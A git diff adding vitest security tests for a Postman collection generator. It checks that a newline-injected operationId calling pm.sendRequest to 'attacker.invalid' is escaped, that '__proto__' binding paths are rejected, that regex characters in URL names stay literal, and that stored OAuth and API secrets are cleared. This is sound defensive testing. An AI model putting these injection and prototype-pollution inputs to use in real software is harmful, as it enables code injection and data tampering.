@@ -1,6 +1,8 @@
 import { describe, expect, it } from 'vitest';
 
 import { applySmokeCollectionAuth, buildCuratedSmokeCollection, buildGeneratedSmokeCollection } from '../src/postman/collection-transform.js';
+import { buildPreRequestScript, buildTestScript } from '../src/postman/scripts.js';
+import { validateFlowManifest } from '../src/flow/validator.js';
 import type { FlowDefinition, ResolvedRequest, SmokeAuthConfig } from '../src/types.js';
 
 const flow: FlowDefinition = {
@@ -76,6 +78,68 @@ const queryApiKeyConfig: SmokeAuthConfig = {
 };
 
 describe('collection transform', () => {
+  it('encodes operationId metadata without creating executable script lines', () => {
+    const malicious = {
+      stepKey: 'malicious-1',
+      operationId: "getPets\npm.sendRequest('https://attacker.invalid');\n//",
+      bindings: [],
+      extract: []
+    };
+
+    for (const script of [buildPreRequestScript(malicious), buildTestScript(malicious)]) {
+      expect(script[0]).not.toContain("\npm.sendRequest");
+      expect(script[0]).toContain('\\npm.sendRequest');
+      expect(script.slice(1).join('\n')).not.toContain('attacker.invalid');
+    }
+  });
+
+  it('rejects prototype-bearing binding paths and leaves Object.prototype unchanged', () => {
+    const maliciousFlow: FlowDefinition = {
+      name: 'Prototype pollution',
+      type: 'smoke',
+      steps: [{
+        stepKey: 'pollute-1',
+        operationId: 'pollute',
+        bindings: [{ fieldKey: '__proto__.polluted', source: 'literal', value: 'x' }],
+        extract: []
+      }]
+    };
+
+    expect(() => validateFlowManifest({ flows: [maliciousFlow] })).toThrow(/unsafe object-path/);
+    expect(() => buildCuratedSmokeCollection(
+      { info: { name: 'source' }, item: [] },
+      maliciousFlow,
+      [{
+        step: maliciousFlow.steps[0]!,
+        item: { name: 'pollute', request: { method: 'POST', url: '/pollute', body: { mode: 'raw', raw: '{}' } } }
+      }]
+    )).toThrow(/Unsafe binding fieldKey/);
+    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
+  });
+
+  it('treats regex metacharacters in URL binding names as literals', () => {
+    const regexFlow: FlowDefinition = {
+      name: 'Literal URL fields',
+      type: 'smoke',
+      steps: [{
+        stepKey: 'regex-1',
+        operationId: 'regex',
+        bindings: [{ fieldKey: '.*', source: 'literal', value: 'x' }],
+        extract: []
+      }]
+    };
+    const result = buildCuratedSmokeCollection(
+      { info: { name: 'source' }, item: [] },
+      regexFlow,
+      [{
+        step: regexFlow.steps[0]!,
+        item: { name: 'regex', request: { method: 'GET', url: '/things/{other}/{.*}' } }
+      }]
+    );
+    const item = (result.collection.item as Array<Record<string, unknown>>)[0]!;
+    expect((item.request as Record<string, unknown>).url).toBe('/things/{other}/{{.*}}');
+  });
+
   it('builds a curated smoke collection with scripted requests', () => {
     const generatedCollection = {
       info: { name: '[Smoke][Temp] Payments API', _postman_id: 'info-123' },
@@ -372,9 +436,42 @@ describe('collection transform', () => {
     expect(collectionText).not.toContain('real-access-token');
   });
 
+  it('clears existing OAuth secrets and cached tokens during transformation', () => {
+    const result = buildCuratedSmokeCollection(
+      {
+        info: { name: '[Smoke][Temp] Payments API' },
+        variable: [
+          { key: 'auth_client_secret', value: 'stored-client-secret', type: 'string' },
+          { key: 'access_token', value: 'stored-access-token', type: 'string' },
+          { key: 'access_token_expires_at', value: '9999999999999', type: 'string' }
+        ],
+        item: []
+      },
+      flow,
+      [{
+        step: flow.steps[0]!,
+        item: { name: 'createPayment', request: { method: 'POST', url: '/payments' } }
+      }],
+      oauthConfig,
+      'aws'
+    );
+    const text = JSON.stringify(result.collection);
+    const variables = result.collection.variable as Array<Record<string, unknown>>;
+
+    expect(text).not.toContain('stored-client-secret');
+    expect(text).not.toContain('stored-access-token');
+    expect(variables.find((entry) => entry.key === 'auth_client_secret')?.value).toBe('');
+    expect(variables.find((entry) => entry.key === 'access_token')?.value).toBe('');
+    expect(variables.find((entry) => entry.key === 'access_token_expires_at')?.value).toBe('');
+  });
+
   it('adds optional API key placeholder variables and collection auth without serializing secrets', () => {
     const result = buildCuratedSmokeCollection(
-      { info: { name: '[Smoke][Temp] Payments API' }, item: [] },
+      {
+        info: { name: '[Smoke][Temp] Payments API' },
+        variable: [{ key: 'service_api_key', value: 'stored-api-key', type: 'string' }],
+        item: []
+      },
       flow,
       [
         {
@@ -415,6 +512,7 @@ describe('collection transform', () => {
     expect(headers).toEqual([{ key: 'Accept', value: 'application/json' }]);
     expect(request.auth).toBeUndefined();
     expect(collectionText).not.toContain('old-static-key');
+    expect(collectionText).not.toContain('stored-api-key');
     expect(collectionText).not.toContain('real-api-key');
   });
 
